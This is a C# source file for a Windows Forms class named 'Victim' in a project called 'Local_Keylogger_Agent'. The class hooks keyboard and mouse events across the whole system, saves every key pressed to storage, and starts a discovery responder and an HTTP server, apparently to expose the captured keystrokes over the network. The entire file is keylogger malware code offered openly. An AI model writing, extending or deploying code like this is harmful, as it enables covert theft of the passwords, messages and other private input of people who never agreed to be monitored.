using Gma.System.MouseKeyHook;

namespace Local_Keylogger_Agent
{
    public partial class Victim : Form
    {
        private IKeyboardMouseEvents globalHook;
        public Victim()
        {
            InitializeComponent();
            Storage storage = new Storage();

            SubscribeGlobal();

            // Start the discovery responder
            DiscoveryResponder discoveryResponder = new DiscoveryResponder();
            discoveryResponder.StartDiscoveryResponder();
            // Start the HTTP server
            HTTPServer HTTPServer = new HTTPServer();
            HTTPServer.StartHTTPServer();
        }

        // Subscribe to all global events
        private void SubscribeGlobal()
        {
            // We get a "global" hook — it catches events all over the computer
            globalHook = Hook.GlobalEvents();

            // Keyboard
            globalHook.KeyDown += GlobalHook_KeyDown;
            globalHook.KeyPress += GlobalHook_KeyPress;

            // Mouse
            globalHook.MouseDown += GlobalHook_MouseDown;
        }

        private void GlobalHook_KeyDown(object sender, KeyEventArgs e)
        {
            Storage.SaveAnyKeyLog(e.KeyCode.ToString());
        }
        private void GlobalHook_KeyPress(object sender, KeyPressEventArgs e)
        {
            // Handle key press events here
        }
        private void GlobalHook_MouseDown(object sender, MouseEventArgs e)
        {
        }
    }
}
